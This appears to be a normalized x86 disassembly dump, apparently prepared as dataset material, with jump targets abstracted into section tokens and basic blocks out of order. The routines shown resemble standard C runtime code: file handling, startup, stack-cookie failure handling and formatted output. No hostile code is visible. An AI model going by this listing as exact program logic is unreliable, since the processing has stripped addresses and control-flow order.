cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_409eaa
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4054d6
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4055d2
mov eax [ ebp - 0x1c ]
cmp esi 0x1
je r-xdata
call sub_409fd5
retn
cmp esi 0x2
jne r-xdata
sub_4055dc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_404ad1
push esi
mov edi eax
call sub_40b7bf
push esi
call sub_409b27
push eax
call sub_40b6fb
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_404538
and [ esi + 0x1c ] 0x0
pop ecx
sub_405649
push 0xc
push r--data
call sub_409f90
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
push esi
call sub_409eaa
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4055dc
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4056b5
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_409fd5
retn
mov eax [ ebp - 0x1c ]
sub_4056bd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_40b7f0
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_40571e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40570e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40445e
pop ecx
sub_40573f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_40b8d0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_405788
push 0x58
push r--data
call sub_409f90
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_405d88
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_407f06
test eax eax
jne r-xdata
push 0x1c
call sub_40575f
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_40bf19
mov [ ebp - 0x4 ] esi
call sub_40b2d1
test eax eax
jns r-xdata
push 0x10
call sub_40575f
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40be82
mov [ rw-data ] eax
call sub_40bdc7
test eax eax
jns r-xdata
push 0x1b
call sub_406073
call sub_40bb51
test eax eax
jns r-xdata
push 0x8
call sub_406073
push 0x1
call sub_405e52
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_406073
call sub_40baf2
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_406073
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_406055
jmp r-xdata
push eax
call sub_406029
push ecx
push eax
push esi
push __dos_header
call sub_401ed0
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_409fd5
retn
sub_4058ff
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40c000
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40c000
pop ecx
sub_405a2f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_408210
lea esi [ eax + 0x1 ]
push esi
call sub_404572
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_40c008
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_405a8d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_405a2f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_405ab4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_405a6f
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_405a2f
jmp r-xdata
sub_405af4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_405a6f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40445e
pop ecx
sub_405b1b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_405ab4
mov eax esi
pop esi
pop ebp
retn 0x4
sub_405b40
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_40c198
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40c0f8
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40c0f8
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_405bf6
mov edi edi
push esi
push 0x4
push 0x20
call sub_40c0ac
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_405c27
push 0xc
push r--data
call sub_409f90
call sub_405de9
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_405b40
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405c5d
mov eax [ ebp - 0x1c ]
call sub_409fd5
retn
sub_405c89
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_405cb1
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_405cfd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405d65
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405d52
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_405cfd
pop ecx
mov esi eax
call sub_405d3f
mov [ eax ] esi
pop esi
pop ebp
retn
sub_405da6
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_405dfb
mov edi edi
push esi
call sub_407c0d
mov esi eax
push esi
call sub_405c7a
push esi
call sub_407056
push esi
call sub_40c474
push esi
call sub_40c465
push esi
call sub_40c260
push esi
call sub_40c24f
add esp 0x18
pop esi
retn
sub_405e2e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_405e52
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c483
push r--data
push r--data
call sub_405e2e
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_40c540
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_40bf3f
call sub_405c63
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_40c540
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_405ee9
push 0x20
push r--data
call sub_409f90
push 0x8
call sub_409da0
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406014
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_409fd5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_409cc7
pop ecx
push [ ebp + 0x8 ]
call sub_405dd1
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_407c0d
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_407c0d
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_406091
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_4060b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_406091
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4042ed
leave
retn
push 0x3
call sub_40c928
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_40c928
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_40c8c5
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_408210
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_40718e
push esi
call sub_40c8aa
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_40c8c5
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_40c768
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_40c8aa
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_40c7dd
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_40c768
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_40c5fc
add esp 0xc
jmp r-xdata
sub_406266
push 0x3
call sub_40c928
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4060b7
push 0xff
call sub_4060b7
pop ecx
pop ecx
push 0x3
call sub_40c928
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40629f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_409b27
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_405d3f
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_405d3f
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_409dd3
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_409a53
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_40cb1f
pop ecx
test eax eax
jne r-xdata
call sub_409dd3
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_409a53
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40cad6
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_40c9ec
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_406403
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40629f
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_406436
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_405d3f
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_405d3f
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_406403
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_405d3f
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_405d3f
cmp [ eax ] 0x2a
jne r-xdata
call sub_405d3f
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_406403
sub_4064aa
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x238 ] eax
call sub_4047c5
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_409b27
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
xor ecx ecx
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4042ed
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x260 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x260 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
sub_407065
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_40aef0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_40c000
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4042ed
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_40c000
pop ecx
sub_40718e
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_407065
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_4071b3
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40718e
int3
pop ebp
jmp eax
sub_4071f0
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40721f
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_40aef0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_407283
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40d119
xor ebx ebx
push ebx
push [ esi + 0x4 ]
